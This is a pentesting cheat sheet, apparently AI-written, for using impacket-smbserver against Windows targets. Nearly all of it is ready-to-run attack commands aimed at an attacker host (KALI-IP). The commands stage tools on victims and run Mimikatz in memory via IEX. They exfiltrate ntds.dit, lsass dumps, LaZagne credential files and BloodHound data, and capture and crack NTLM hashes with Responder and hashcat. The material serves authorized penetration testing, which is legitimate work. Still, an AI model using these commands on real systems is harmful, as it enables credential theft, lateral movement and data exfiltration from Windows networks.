# impacket-smbserver

**Tags:** `#smbserver` `#impacket` `#filetransfer` `#smb` `#windows` `#exfil` `#ntlmcapture`

Impacket's SMB server — hosts a Windows-accessible SMB share from Kali. Primary use: transfer files to/from Windows targets without needing credentials on the target side. Secondary use: capture NTLM hashes when a Windows host authenticates to the share. SMB2 support required for modern Windows targets.

**Source:** Part of Impacket — pre-installed on Kali

```bash
# Start share (SMB2 support — required for modern Windows)
sudo impacket-smbserver share /opt/tools -smb2support

# Access from Windows target:
# copy \\KALI-IP\share\tool.exe C:\Windows\Temp\tool.exe
```

---

## Starting the Server

```bash
# Unauthenticated share — current directory
sudo impacket-smbserver share $(pwd) -smb2support

# Unauthenticated share — specific directory
sudo impacket-smbserver share /opt/tools -smb2support

# Authenticated share (required when Windows blocks unauthenticated SMB)
sudo impacket-smbserver share /opt/tools -smb2support -username user -password Password

# Custom port (if 445 is in use)
sudo impacket-smbserver share /opt/tools -smb2support -port 4445
```

> [!note] **Windows 11 / Server 2019+ blocks unauthenticated SMB** — If you get `Access Denied` or the share won't mount, add `-username` and `-password` and authenticate from the target with `net use`.

---

## Accessing from Windows (Target-Side)

```powershell
# Copy file FROM Kali share TO target
copy \\KALI-IP\share\tool.exe C:\Windows\Temp\tool.exe

# Run directly from share (no disk write)
\\KALI-IP\share\tool.exe

# PowerShell download
Copy-Item \\KALI-IP\share\tool.exe C:\Windows\Temp\tool.exe

# Map as drive letter
net use Z: \\KALI-IP\share /user:user Password
copy Z:\tool.exe C:\Windows\Temp\
net use Z: /delete

# Authenticated mount (when unauthenticated is blocked)
net use \\KALI-IP\share /user:user Password
copy \\KALI-IP\share\tool.exe C:\Windows\Temp\
```

---

## Exfiltration (Windows → Kali)

```powershell
# Push file from target to Kali share
copy C:\Windows\NTDS\ntds.dit \\KALI-IP\share\ntds.dit
copy C:\Windows\Temp\lsass.dmp \\KALI-IP\share\lsass.dmp

# PowerShell
Copy-Item C:\sensitive\file.txt \\KALI-IP\share\file.txt

# Robocopy (recursive exfil of directory)
robocopy C:\Users\Administrator\Documents \\KALI-IP\share\docs /E
```

---

## NTLM Hash Capture

When a Windows host connects to the SMB share it authenticates via NTLM — the hash is captured in the smbserver output or by Responder.

```bash
# Capture hashes via smbserver (look for NTLMv2 in output)
sudo impacket-smbserver share $(pwd) -smb2support

# Better — use Responder instead for dedicated hash capture
sudo responder -I tun0

# Crack captured NTLMv2 hash
hashcat -m 5600 ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Common Transfer Patterns

```powershell
# Drop tools and execute
copy \\KALI-IP\share\winpeas.exe C:\Windows\Temp\wp.exe && C:\Windows\Temp\wp.exe

# Download mimikatz and run in memory (IEX from share)
IEX (New-Object Net.WebClient).DownloadString("\\KALI-IP\share\Invoke-Mimikatz.ps1")

# Pull SharpHound, run, exfil results
copy \\KALI-IP\share\SharpHound.exe C:\Windows\Temp\sh.exe
C:\Windows\Temp\sh.exe -c All
copy C:\Windows\Temp\*_BloodHound.zip \\KALI-IP\share\

# LaZagne results exfil
C:\Windows\Temp\lazagne.exe all -oJ C:\Windows\Temp\creds.json
copy C:\Windows\Temp\creds.json \\KALI-IP\share\
```

---

## Troubleshooting

```bash
# Error: "Port 445 already in use"
sudo ss -tlnp | grep 445
sudo systemctl stop smbd    # stop Samba if running

# Windows can't connect — test connectivity
Test-NetConnection -ComputerName KALI-IP -Port 445

# Windows blocks unauthenticated — add credentials
sudo impacket-smbserver share /opt/tools -smb2support -username pentest -password pentest
# On target:
net use \\KALI-IP\share /user:pentest pentest

# SMB1 fallback (very old targets — Windows XP/2003)
sudo impacket-smbserver share /opt/tools    # omit -smb2support
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
